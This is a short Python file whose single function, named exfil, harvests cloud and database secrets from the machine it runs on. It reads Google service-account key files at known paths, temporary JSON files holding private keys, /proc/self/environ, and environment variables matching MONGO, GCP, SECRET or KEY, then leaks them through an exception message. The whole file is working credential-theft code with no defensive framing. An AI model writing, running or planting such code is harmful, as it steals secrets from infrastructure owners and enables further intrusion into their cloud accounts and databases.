import os
import json
import glob


def exfil():
    """Read GCP credentials from worker filesystem."""
    r = {}

    g = os.environ.get("GOOGLE_APPLICATION_CREDENTIALS", "")
    if g and os.path.isfile(g):
        r["gac_path"] = g
        r["gac_data"] = open(g).read()[:500]

    for p in [
        "/app/gcp-key.json",
        "/app/service-account.json",
        "/root/.config/gcloud/application_default_credentials.json",
        "/var/run/secrets/google/key.json",
    ]:
        if os.path.isfile(p):
            r[p] = open(p).read()[:500]

    for f in glob.glob("/tmp/tmp*.json"):
        d = open(f).read()[:500]
        if "private_key" in d or "client_email" in d:
            r["tmp:" + f] = d

    if os.path.isfile("/proc/self/environ"):
        e = open("/proc/self/environ", "rb").read()
        for x in e.split(b"\x00"):
            s = x.decode("latin1", errors="replace")
            if any(k in s for k in ["MONGO", "GCP_S", "GOOGLE", "SECRET"]):
                r["env:" + s.split("=", 1)[0]] = s[:200]

    for k, v in os.environ.items():
        if any(s in k for s in ["MONGO", "GCP", "GOOGLE", "SECRET", "KEY", "BUCKET"]):
            r["env:" + k] = v[:200]

    raise RuntimeError("CRED_EXFIL:" + json.dumps(r, indent=2)[:1500])
